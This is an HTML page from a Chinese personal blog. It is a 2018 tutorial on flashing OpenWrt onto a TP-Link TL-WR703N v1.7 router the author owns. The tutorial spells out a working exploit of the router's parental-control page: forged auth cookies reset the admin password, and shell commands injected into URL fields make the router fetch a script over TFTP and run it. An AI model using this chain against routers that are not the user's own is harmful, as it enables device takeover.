@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.3.1/css/all.min.css" integrity="sha256-4Lad8m4ZWW1Lgb9+sMVLYEfnIh7BjV1NQMEe79Pviks=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"huangwang.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="我的TL-WR703N路由器运行不稳定，就准备尝试刷最新的OpenWRT，看看能否好一点。 准备工作 一个 TP-Link TL-WR703N 路由器，确保固件版本为 3.17.1 Build 140120 Rel.56593n  1# 在刷机之前，按reset按钮重置路由器  TL-WR703N 的 openwrt 固件 openwrt-ar71xx-generic-tl-wr703n-v1-s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TL-WR703N版本v1.7刷openwrt教程">
+<meta property="og:url" content="https://huangwang.github.io/2018/12/31/TL-WR703N%E7%89%88%E6%9C%ACv1-7%E5%88%B7openwrt%E6%95%99%E7%A8%8B/index.html">
+<meta property="og:site_name" content="Jack Huang&#39;s Blog">
+<meta property="og:description" content="我的TL-WR703N路由器运行不稳定，就准备尝试刷最新的OpenWRT，看看能否好一点。 准备工作 一个 TP-Link TL-WR703N 路由器，确保固件版本为 3.17.1 Build 140120 Rel.56593n  1# 在刷机之前，按reset按钮重置路由器  TL-WR703N 的 openwrt 固件 openwrt-ar71xx-generic-tl-wr703n-v1-s">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-12-31T03:49:39.000Z">
+<meta property="article:modified_time" content="2021-07-16T15:07:17.849Z">
+<meta property="article:author" content="Jack Huang">
+<meta property="article:tag" content="笔记本">
+<meta property="article:tag" content="计算机网络">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://huangwang.github.io/2018/12/31/TL-WR703N%E7%89%88%E6%9C%ACv1-7%E5%88%B7openwrt%E6%95%99%E7%A8%8B/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://huangwang.github.io/2018/12/31/TL-WR703N%E7%89%88%E6%9C%ACv1-7%E5%88%B7openwrt%E6%95%99%E7%A8%8B/","path":"2018/12/31/TL-WR703N版本v1-7刷openwrt教程/","title":"TL-WR703N版本v1.7刷openwrt教程"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>TL-WR703N版本v1.7刷openwrt教程 | Jack Huang's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-search popup-trigger" aria-label="搜索" role="button">
+      <i class="fa fa-search fa-fw fa-lg"></i>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Jack Huang's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-toggle" aria-label="切换导航栏" role="button">
+      <i class="fa fa-ellipsis fa-fw fa-lg"></i>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  
+  <template id="search-popup-template"><div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div></template>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%B7%E6%9C%BA%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">刷机流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%90%AD%E5%BB%BAtftp%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.1.</span> <span class="nav-text">搭建tftp服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hack-into-TL-WR703N"><span class="nav-number">2.2.</span> <span class="nav-text">Hack into TL-WR703N</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#openwrt%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE"><span class="nav-number">3.</span> <span class="nav-text">openwrt系统配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Jack Huang</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">552</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">70</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://huangwang.github.io/2018/12/31/TL-WR703N%E7%89%88%E6%9C%ACv1-7%E5%88%B7openwrt%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Jack Huang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jack Huang's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="TL-WR703N版本v1.7刷openwrt教程 | Jack Huang's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TL-WR703N版本v1.7刷openwrt教程
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2018-12-31 11:49:39" itemprop="dateCreated datePublished" datetime="2018-12-31T11:49:39+08:00">2018-12-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2021-07-16 23:07:17" itemprop="dateModified" datetime="2021-07-16T23:07:17+08:00">2021-07-16</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>我的TL-WR703N路由器运行不稳定，就准备尝试刷最新的OpenWRT，看看能否好一点。</p>
+<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ul>
+<li>一个 TP-Link TL-WR703N 路由器，确保固件版本为 3.17.1 Build 140120 Rel.56593n</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 在刷机之前，按reset按钮重置路由器</span><br></pre></td></tr></table></figure>
+<ul>
+<li>TL-WR703N 的 openwrt 固件 openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 下载openwrt固件并拆分成两份（因为wr703n的内存很小，可能传输的时候传不了整个文件）</span><br><span class="line">curl https://downloads.openwrt.org/snapshots/trunk/ar71xx/generic/openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin -o openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin</span><br><span class="line">dd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i1 bs=1 count=1048576</span><br><span class="line">dd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i2 bs=1 skip=1048576</span><br></pre></td></tr></table></figure>
+<ul>
+<li>TFTP 服务器</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 安装TFTP的客户端和服务器端</span><br><span class="line">sudo apt-get install atftp atftpd</span><br></pre></td></tr></table></figure>
+<ul>
+<li>busybox 1.16.1 MIPS 版</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://busybox.net/downloads/binaries/1.21.1/busybox-mips &gt; busybox</span><br></pre></td></tr></table></figure>
+<ul>
+<li>编写Hack脚本</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">tftp -gl i1 192.168.1.100 # 把i1从tftp服务器下载下来，这里的ip应该是，你的tftp服务器连接路由器之后，ifconfig看到的ip</span><br><span class="line">tftp -gl i2 192.168.1.100 # 把i2从tftp服务器下载下来</span><br><span class="line">tftp -gl busybox 192.168.1.100 # 把busybox从tftp服务器下载下来</span><br><span class="line">chmod 755 busybox  # 修改busybox权限以执行命令</span><br><span class="line">./busybox dd if=i1 of=/dev/mtdblock1 conv=fsync # 将i1写入磁盘分区</span><br><span class="line">./busybox dd if=i2 of=/dev/mtdblock2 conv=fsync # 将i2写入磁盘分区</span><br><span class="line">reboot -f # 重启，会启动openwrt</span><br></pre></td></tr></table></figure>
+
+<h1 id="刷机流程"><a href="#刷机流程" class="headerlink" title="刷机流程"></a>刷机流程</h1><p>在V1.7以前，可以通过路由器的Web UI直接将openwrt刷到板子上，但在V1.7之后，只能通过利用TP-LINK家长控制的漏洞，让路由板执行一些代码，成功刷写openwrt系统。本教程就是利用TP-LINK家长控制的漏洞进行openwrt刷机。下面介绍openwrt刷机的步骤。</p>
+<h2 id="搭建tftp服务器"><a href="#搭建tftp服务器" class="headerlink" title="搭建tftp服务器"></a>搭建tftp服务器</h2><p>在Debian操作系统中搭建tftp服务器请参考链接4。将busybox、 拆开的固件i1和i2、Hack脚本aa放入tftp服务器目录。</p>
+<h2 id="Hack-into-TL-WR703N"><a href="#Hack-into-TL-WR703N" class="headerlink" title="Hack into TL-WR703N"></a>Hack into TL-WR703N</h2><p>这个方法是利用TPLINK家长控制漏洞，以curl的方式执行命令，让路由器从tftp服务器上下载脚本，执行命令，从而将openwrt固件写入路由器。</p>
+<blockquote>
+<p>【警告】以下步骤可能导致你的路由器变砖，请确认当前的路由器固件版本是3.17.1 Build 140120. 下述全过程请勿断开连接或是断开电源，本人不对产生的任何后果负责！另外，每一步都很重要，别忽略其中任何一步。一旦变砖，请用3.3V的串口线抢救。</p>
+</blockquote>
+<p>步骤如下：</p>
+<ul>
+<li><p>长按reboot按钮将路由器恢复出厂设置</p>
+</li>
+<li><p>将tftp服务器通过WiFi的方式连接到路由器 TL-WR703N，ifconfig记住tftp服务器的ip，我的是192.168.1.100</p>
+</li>
+<li><p>在tftp服务器上执行如下命令修改路由器WebUI默认管理员密码</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 此处修改密码为admin42，注意Cookies中认证变量Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D即是设置管理员密码为admin42。后续将继续使用该变量进行其他操作，如果认证变量不正确，操作将无法执行。</span><br><span class="line">curl -o - -b &#x27;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=true&#x27; &#x27;http://192.168.1.1/&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>启用家长控制（利用漏洞）</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o - -b &#x27;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=&#x27; --referer &#x27;http://192.168.1.1/userRpm/ParentCtrlRpm.htm&#x27; &#x27;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?ctrl_enable=1&amp;parent_mac_addr=00-00-00-00-00-02&amp;Page=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>让路由器从tftp服务器下载并执行脚本</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 执行下述命令后，等待大约三分钟，路由器会重启进入openwrt系统，状态灯会闪烁一会儿</span><br><span class="line">curl -o - -b &#x27;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=&#x27; --referer &#x27;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Modify=0&amp;Page=1&#x27; &#x27;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?child_mac=00-00-00-00-00-01&amp;lan_lists=888&amp;url_comment=test&amp;url_0=;cd%20/tmp;&amp;url_1=;tftp%20-gl%20aa%20192.168.1.100;&amp;url_2=;sh%20aa;&amp;url_3=&amp;url_4=&amp;url_5=&amp;url_6=&amp;url_7=&amp;scheds_lists=255&amp;enable=1&amp;Changed=1&amp;SelIndex=0&amp;Page=1&amp;rule_mode=0&amp;Save=%B1%A3+%B4%E6&#x27;</span><br></pre></td></tr></table></figure>
+
+<h1 id="openwrt系统配置"><a href="#openwrt系统配置" class="headerlink" title="openwrt系统配置"></a>openwrt系统配置</h1><p>openwrt默认使用LuCI 用户界面，具体配置方法暂时没有时间研究。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://cubicpill.me/2018/03/17/wr703n-openwrt.html">给 v1.7 版本的 TL-WR703N 刷 openwrt</a>,by Cubic Zone.</li>
+<li><a target="_blank" rel="noopener" href="https://juejin.im/entry/5a2f92df6fb9a0450d110c14">TL-WR703N v1.7刷openwrt</a>,by 梦里茶.</li>
+<li><a target="_blank" rel="noopener" href="https://openwrt.org/toh/tp-link/tl-wr703n">TP-Link TL-WR703N</a>,by openwrt.</li>
+<li><a href="https://huangwang.github.io/2018/12/30/Debian%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8TFTP/">Debian安装配置使用TFTP</a>,by jack huang.</li>
+<li><a target="_blank" rel="noopener" href="https://www.practicalnetworking.net/series/packet-traveling/packet-traveling/">Packet Traveling</a>,by ed harmoush.</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/" rel="tag"># 笔记本</a>
+              <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag"># 计算机网络</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2018/12/30/Debian%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8TFTP/" rel="prev" title="Debian安装配置使用TFTP">
+                  <i class="fa fa-angle-left"></i> Debian安装配置使用TFTP
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/01/01/Python%E6%89%B9%E9%87%8F%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6/" rel="next" title="Python批量重命名文件">
+                  Python批量重命名文件 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Jack Huang</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
